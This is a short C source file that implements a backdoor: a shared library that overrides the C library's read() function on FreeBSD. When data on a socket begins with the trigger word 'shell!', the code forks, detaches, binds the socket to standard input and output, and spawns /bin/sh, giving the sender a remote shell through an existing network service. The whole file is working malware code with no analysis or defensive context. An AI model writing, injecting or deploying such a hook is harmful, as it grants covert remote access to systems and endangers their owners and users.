/*
 * Copyright (c) 2011-2014, Shawn Webb
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 *    1) Redistributions of source code must retain the above
 *       copyright notice, this list of conditions and the following
 *       disclaimer.
 *    2) Redistributions in binary form must reproduce the above
 *       copyright notice, this list of conditions and the following
 *       disclaimer in the documentation and/or other materials
 *       provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND
 * CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES,
 * INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
 * DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR
 * CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
 * SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
 * LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF
 * USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED
 * AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
 * ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
 * POSSIBILITY OF SUCH DAMAGE.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dlfcn.h>
#include <unistd.h>

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <signal.h>
#include <sys/wait.h>

static void *dl;
ssize_t (*orig_read)(int, void *, size_t);

__attribute__((constructor)) void stub(void)
{
	dl = dlopen("/lib/libc.so.7", RTLD_LAZY | RTLD_GLOBAL);
	orig_read = dlsym(dl, "read");
	
}

void sigchld(int signo)
{
	while (waitpid(-1, NULL, WNOHANG) > 0)
		;
}

/*
 * Fork a shell and re-use the current socket
 */
ssize_t read(int socket, void *buffer, size_t length)
{
	ssize_t ret;
	FILE *fp;
	char filename[1024+1];
	
	ret = orig_read(socket, buffer, length);
	if (ret < strlen("shell!\n"))
		return ret;
	if (memcmp(buffer, "shell!", strlen("shell!")))
		return ret;
	
	if (fork())
		return 0;
	setsid();
	if (fork())
		return 0;
	
	dup2(socket, fileno(stdin));
	dup2(socket, fileno(stdout));
	dup2(socket, fileno(stderr));
	execl("/bin/sh", "sh", NULL);
	
	return -1;
}
